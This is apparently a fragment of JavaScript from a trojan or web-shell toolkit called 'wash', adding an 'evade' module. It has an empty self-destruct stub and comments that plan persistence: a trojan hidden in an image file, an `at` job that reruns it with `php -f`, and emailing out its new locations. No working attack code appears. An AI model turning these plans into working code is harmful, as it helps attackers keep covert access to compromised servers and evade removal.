// Here we pop open the wash object once again to patch in some tailored
// functionality.
wash.evade = {
    // monitor bash_history, maybe?

    // deletes the trojan and associated files from the target server
    autodestruct: function(){

    }

    /**
     * It would be awesome to create an image file which contains embedded
     * trojan code. Setting an `at` job to `php -f` that image recreates the
     * trojan if it has been destroyed.
     *
     * It should also contain some procedural code to write the trojan into a
     * new location, and email out that location
     *
     * Should also create another file/object that can send emails. This might
     * belong in an "exfil" class or something, which would probably have some
     * aliases to `wash.file.down()` and such.
     */
};
